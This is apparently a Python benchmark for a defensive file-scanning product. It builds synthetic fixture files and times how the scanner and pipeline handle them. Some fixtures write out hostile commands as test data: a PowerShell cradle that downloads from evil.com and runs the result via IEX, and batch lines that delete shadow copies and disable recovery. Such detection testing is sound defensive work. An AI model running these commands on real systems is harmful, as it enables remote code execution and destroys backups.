"""
ACTIS Week 5 Integration Audit: Mixed-Directory Benchmark
Measures static file analysis and pipeline performance across a deterministic
synthetic directory tree without executing any code or requiring live malware.
"""

import gzip
import os
import struct
import tarfile
import time
import tracemalloc
import zipfile
from dataclasses import dataclass, field
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional

# Ensure ACTIS project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scanners.file_scanner import scan_file
from scanners.file_feature_extractor import DOS_SIGNATURE
from service.file_pipeline import FileProtectionPipeline, EventProcessingStatus
from service.events import SecurityEvent, SecurityEventType
from service.protection_service import ProtectionService
from service.config import ServiceConfig
from scanners.incremental_state import IncrementalStateManager


from tests.test_static_pe import create_minimal_synthetic_pe


def build_synthetic_fixture_tree(base_dir: Path) -> List[Path]:
    """Generates a deterministic synthetic fixture directory containing diverse file types."""
    base_dir.mkdir(parents=True, exist_ok=True)
    created_files: List[Path] = []

    # 1. Text files (small, medium, large)
    f1 = base_dir / "notes_readme.txt"
    f1.write_text("ACTIS defensive security platform deployment notes.\nAll controls nominal.\n", encoding="utf-8")
    created_files.append(f1)

    f2 = base_dir / "system_changelog.log"
    f2.write_text("Log entry: service started successfully at timestamp 1700000000.\n" * 50, encoding="utf-8")
    created_files.append(f2)

    f3 = base_dir / "large_data_table.csv"
    f3.write_text("id,name,role,status\n" + ("1,admin,secops,active\n" * 1500), encoding="utf-8")
    created_files.append(f3)

    # 2. Benign scripts
    f4 = base_dir / "backup_archive.ps1"
    f4.write_text("# PowerShell maintenance script\nparam($TargetDir = 'C:\\Backup')\nWrite-Output \"Backing up $TargetDir\"\n", encoding="utf-8")
    created_files.append(f4)

    f5 = base_dir / "cleanup_cache.bat"
    f5.write_text("@echo off\r\nrem Clean temp folders\r\necho Cleanup completed.\r\n", encoding="utf-8")
    created_files.append(f5)

    f6 = base_dir / "report_generator.py"
    f6.write_text("# Python reporting tool\nimport sys\ndef main():\n    print('Summary report generated.')\nif __name__ == '__main__':\n    main()\n", encoding="utf-8")
    created_files.append(f6)

    # 3. Scripts with heuristic detection patterns
    f7 = base_dir / "dropper_cradle.ps1"
    f7.write_text("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadString('http://evil.com/payload') | IEX\"\n", encoding="utf-8")
    created_files.append(f7)

    f8 = base_dir / "ransomware_recovery_tamper.bat"
    f8.write_text("@echo off\r\nvssadmin delete shadows /all /quiet\r\nbcdedit /set recoveryenabled no\r\nwbadmin delete catalog -quiet\r\n", encoding="utf-8")
    created_files.append(f8)

    f9 = base_dir / "dynamic_eval_loader.py"
    f9.write_text("import base64\nencoded = 'cHJpbnQoImhpIik='\nexec(base64.b64decode(encoded))\n", encoding="utf-8")
    created_files.append(f9)

    # 4. Synthetic archives
    f10 = base_dir / "benign_docs.zip"
    with zipfile.ZipFile(f10, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("doc1.txt", "Quarterly defensive security assessment")
        zf.writestr("doc2.txt", "Incident response escalation contact sheet")
    created_files.append(f10)

    f11 = base_dir / "camouflage_archive.zip"
    with zipfile.ZipFile(f11, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("invoice.pdf.exe", b"MZ\x00\x00fake_executable_content")
    created_files.append(f11)

    f12 = base_dir / "archive_backup.tar"
    with tarfile.open(f12, "w") as tf:
        data = b"system configuration dump data"
        ti = tarfile.TarInfo("config.cfg")
        ti.size = len(data)
        import io
        tf.addfile(ti, io.BytesIO(data))
    created_files.append(f12)

    f13 = base_dir / "compressed_logs.log.gz"
    with gzip.open(f13, "wb") as gf:
        gf.write(b"2026-10-12 12:00:00 - Service health OK\n" * 100)
    created_files.append(f13)

    # 5. Malformed & bomb archives
    f14 = base_dir / "corrupted_archive.zip"
    f14.write_bytes(b"PK\x03\x04\x14\x00\x00\x00\x08\x00truncated_header_data_without_eocd")
    created_files.append(f14)

    f15 = base_dir / "decompression_bomb.zip"
    with zipfile.ZipFile(f15, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("huge_zeroes.dat", b"\x00" * (500 * 1024))
    created_files.append(f15)

    # 6. Synthetic PE binaries
    f16 = base_dir / "benign_sample.exe"
    f16.write_bytes(create_minimal_synthetic_pe())
    created_files.append(f16)

    f17 = base_dir / "corrupt_pe_header.exe"
    raw_pe = bytearray(create_minimal_synthetic_pe())
    raw_pe[0x80:0x84] = b"CORR"  # Corrupted PE signature
    f17.write_bytes(bytes(raw_pe))
    created_files.append(f17)

    # 7. Disguised script with .exe extension
    f18 = base_dir / "disguised_batch.exe"
    f18.write_text("@echo off\r\nvssadmin delete shadows /all /quiet\r\n", encoding="utf-8")
    created_files.append(f18)

    # 8. Empty files
    f19 = base_dir / "empty_note.txt"
    f19.write_bytes(b"")
    created_files.append(f19)

    f20 = base_dir / "empty_binary.exe"
    f20.write_bytes(b"")
    created_files.append(f20)

    # 9. Unsupported archive
    f21 = base_dir / "unsupported_container.7z"
    f21.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x04synthetic_7z_header")
    created_files.append(f21)

    # 10. Random / generic binaries
    f22 = base_dir / "random_payload.bin"
    f22.write_bytes(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" + b"\xDE\xAD\xBE\xEF" * 128)
    created_files.append(f22)

    f23 = base_dir / "opaque_firmware.rom"
    f23.write_bytes(bytes(range(256)) * 8)
    created_files.append(f23)

    # 11. Large binary (256 KB)
    f24 = base_dir / "asset_pack.dat"
    f24.write_bytes(b"\x00\x01\x02\x03" * 65536)
    created_files.append(f24)

    return created_files


@dataclass
class BenchmarkResults:
    total_discovered: int = 0
    successfully_analyzed: int = 0
    files_skipped: int = 0
    skip_reasons: Dict[str, int] = field(default_factory=dict)
    files_failed: int = 0
    total_analysis_time_seconds: float = 0.0
    latencies_ms: List[float] = field(default_factory=list)
    latency_min_ms: float = 0.0
    latency_avg_ms: float = 0.0
    latency_p50_ms: float = 0.0
    latency_p95_ms: float = 0.0
    latency_max_ms: float = 0.0
    analyzer_counts: Dict[str, int] = field(default_factory=dict)
    format_counts: Dict[str, int] = field(default_factory=dict)
    peak_memory_bytes: int = 0
    pipeline_total_time_seconds: float = 0.0
    pipeline_events_processed: int = 0
    pipeline_analyzed_count: int = 0
    pipeline_unchanged_count: int = 0
    pipeline_threat_count: int = 0


def run_mixed_directory_benchmark(target_dir: Path) -> BenchmarkResults:
    """Executes the benchmark across discovered files in target_dir."""
    files = [p for p in target_dir.glob("**/*") if p.is_file()]
    results = BenchmarkResults(total_discovered=len(files))

    tracemalloc.start()
    t_start = time.perf_counter()

    latencies = []
    for f in files:
        f_start = time.perf_counter()
        res = scan_file(f)
        f_end = time.perf_counter()
        lat_ms = (f_end - f_start) * 1000.0
        latencies.append(lat_ms)

        if not res.get("error") and "score" in res:
            results.successfully_analyzed += 1
        elif res.get("error"):
            results.files_failed += 1
        else:
            results.files_skipped += 1
            reason = "other"
            for w in res.get("warnings", []):
                if "empty" in w.lower():
                    reason = "empty_file"
                elif "exceeds" in w.lower():
                    reason = "oversized"
            results.skip_reasons[reason] = results.skip_reasons.get(reason, 0) + 1

        method = res.get("analysis_method", "UNKNOWN")
        fmt = res.get("detected_format", "UNKNOWN")
        results.analyzer_counts[method] = results.analyzer_counts.get(method, 0) + 1
        results.format_counts[fmt] = results.format_counts.get(fmt, 0) + 1

    t_end = time.perf_counter()
    _, peak_mem = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    results.total_analysis_time_seconds = t_end - t_start
    results.latencies_ms = latencies
    results.peak_memory_bytes = peak_mem

    if latencies:
        sorted_lats = sorted(latencies)
        results.latency_min_ms = round(sorted_lats[0], 2)
        results.latency_max_ms = round(sorted_lats[-1], 2)
        results.latency_avg_ms = round(sum(sorted_lats) / len(sorted_lats), 2)
        p50_idx = int(len(sorted_lats) * 0.50)
        p95_idx = min(len(sorted_lats) - 1, int(len(sorted_lats) * 0.95))
        results.latency_p50_ms = round(sorted_lats[p50_idx], 2)
        results.latency_p95_ms = round(sorted_lats[p95_idx], 2)

    # Measure End-to-End FileProtectionPipeline Processing
    state_mgr = IncrementalStateManager(auto_load=False)
    pipeline = FileProtectionPipeline(state_manager=state_mgr)
    pipe_start = time.perf_counter()

    threat_count = 0
    for f in files:
        ev = SecurityEvent(
            event_type=SecurityEventType.FILE_CREATED,
            source="benchmark_pipeline",
            target=str(f),
        )
        proc_res = pipeline.process_file_event(ev)
        if proc_res.is_threat:
            threat_count += 1

    pipe_end = time.perf_counter()
    results.pipeline_total_time_seconds = pipe_end - pipe_start
    pipe_stats = pipeline.get_stats()
    results.pipeline_events_processed = pipe_stats["events_processed"]
    results.pipeline_analyzed_count = pipe_stats["analyzed_count"]
    results.pipeline_threat_count = threat_count

    return results


if __name__ == "__main__":
    import tempfile
    with tempfile.TemporaryDirectory() as td:
        tmp_dir = Path(td)
        created = build_synthetic_fixture_tree(tmp_dir)
        print(f"=== ACTIS Mixed-Directory Benchmark ===")
        print(f"Created {len(created)} synthetic fixtures in: {tmp_dir}")
        b_res = run_mixed_directory_benchmark(tmp_dir)
        print(f"\n--- Benchmark Results ---")
        print(f"Total Discovered Files: {b_res.total_discovered}")
        print(f"Successfully Analyzed:  {b_res.successfully_analyzed}")
        print(f"Failed Analyses:        {b_res.files_failed}")
        print(f"Total Analysis Time:    {b_res.total_analysis_time_seconds:.4f}s")
        print(f"Latency (Min / Avg / P50 / P95 / Max): "
              f"{b_res.latency_min_ms}ms / {b_res.latency_avg_ms}ms / "
              f"{b_res.latency_p50_ms}ms / {b_res.latency_p95_ms}ms / {b_res.latency_max_ms}ms")
        print(f"Peak Traced Memory:     {b_res.peak_memory_bytes / 1024:.2f} KB")
        print(f"\n--- Analyzer Selection Counts ---")
        for m, count in sorted(b_res.analyzer_counts.items()):
            print(f"  {m:<32}: {count}")
        print(f"\n--- Detected Format Counts ---")
        for f, count in sorted(b_res.format_counts.items()):
            print(f"  {f:<32}: {count}")
        print(f"\n--- Pipeline Handoff Performance ---")
        print(f"Pipeline Total Time:    {b_res.pipeline_total_time_seconds:.4f}s")
        print(f"Events Ingested:        {b_res.pipeline_events_processed}")
        print(f"Threats Detected:       {b_res.pipeline_threat_count}")
